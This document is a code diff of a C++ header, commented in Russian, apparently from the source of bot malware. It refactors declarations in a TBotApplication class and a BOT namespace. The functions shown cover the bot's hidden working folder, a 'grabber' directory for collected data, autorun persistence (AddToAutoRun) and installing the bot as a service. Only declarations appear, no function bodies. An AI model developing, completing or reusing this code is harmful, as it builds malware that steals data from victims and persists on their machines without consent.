@@ -100,11 +100,9 @@ private:
     string FUID;
 	string FApplicationName;
 	string FPerfixFileName;
-	string FWorkPath;
+
 	string FGrabberPath;
 
-	string MakeWorkPath();
-	PCHAR  GetWorkFolder(); // Функция возвращает имя рабочей папки бота
 public:
 	TBotApplication();
 	~TBotApplication();
@@ -116,7 +114,6 @@ public:
 	string ApplicationName(); // Имя приложения в котором работает бот
 
 	string PrefixFileName();  // Функция возвращает имя файла для хранения префикса
-	string WorkPath();        // Путь к рабочему каталогу бота
 	string GrabberPath();     // Путь к рабочему каталогу грабера данных
 
 	string MakePath(const char* SubDirectory);   // Функция собирает путь с указанной поддиректорией
@@ -154,13 +151,20 @@ namespace BOT
 
 
 	//----------------------------------------------------
-	// GetBotPath - Имя крневого каталога бота
+	// GetBotPath - Имя кoрневого каталога бота
 	//              В этом каталоге будут лежать самые
 	//              выжные файлы бота.
 	//  Для некритичных, временных и других файлов
 	//  использовать GetWorkPath()
 	//----------------------------------------------------
-    string GetBotPath();
+	string GetBotPath();
+
+
+	//-------------------------------------------
+	// WorkPath - Функция возвращает полный путь
+	//            рабочего каталога бота
+	//-------------------------------------------
+	string WorkPath();
 
 	//----------------------------------------------------
 	// Функция возвращает рабочий каталог бота
@@ -180,7 +184,7 @@ namespace BOT
 	//  	Главное от личие от нёэ в том, что пусть
 	//      создаётся в корне системного диска
 	//----------------------------------------------------
-	PCHAR GetWorkPathInSysDrive(PCHAR SubDir = NULL, PCHAR FileName = NULL);
+	//PCHAR GetWorkPathInSysDrive(PCHAR SubDir = NULL, PCHAR FileName = NULL);
 
 	//----------------------------------------------------
 	//  GetWorkFolderHash - Функция возвращает хэш
@@ -197,7 +201,7 @@ namespace BOT
 	//  GetBotLinkName - Функция возвращает имя файла
 	//     				 ярлыка бота
 	//----------------------------------------------------
-	string GetBotLinkName();
+	//string GetBotLinkName();
 
 	//----------------------------------------------------
 	//  GetBotExeNameHash - Функция возвращает хэш имя
@@ -229,12 +233,11 @@ namespace BOT
 	void Unprotect();
 
 
-
-
 	//----------------------------------------------------
 	// AddToAutoRun - Функция добавляет бот в автозагрузку
 	//----------------------------------------------------
 	bool AddToAutoRun(PCHAR FileName);
+
 
 	//----------------------------------------------------
 	// InstallService - Функция инсталирует ехе бота
